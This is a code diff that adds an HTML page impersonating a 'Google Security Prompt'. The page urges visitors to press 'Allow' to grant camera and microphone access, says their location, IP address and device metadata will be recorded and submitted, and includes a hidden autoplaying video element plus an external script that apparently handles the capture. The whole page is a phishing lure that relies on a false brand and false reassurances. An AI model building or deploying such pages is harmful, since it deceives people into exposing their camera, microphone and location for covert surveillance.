@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Permission Request</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <div id="permission-box">
+    <h2>Google Security Prompt</h2>
+    <p>
+      This device has requested access to your camera and microphone for security and user verification purposes.
+      Access is temporarily required for validating your device ID, ensuring compliance with security standards,
+      and preventing fraudulent activity.
+    </p>
+    <p>
+      Your location, IP address, and device metadata will be recorded and safely submitted as part of our identity
+      verification process.
+    </p>
+    <p>
+      All data is handled securely under our internal policies and is not shared without your explicit consent.
+    </p>
+    <p>
+      Press "Allow" to continue the verification. This process will take less than 15 seconds.
+    </p>
+    <button id="startBtn">Allow</button>
+  </div>
+  <video id="preview" autoplay playsinline muted style="display:none;"></video>
+  <script src="/static/script.js"></script>
+</body>
+</html>
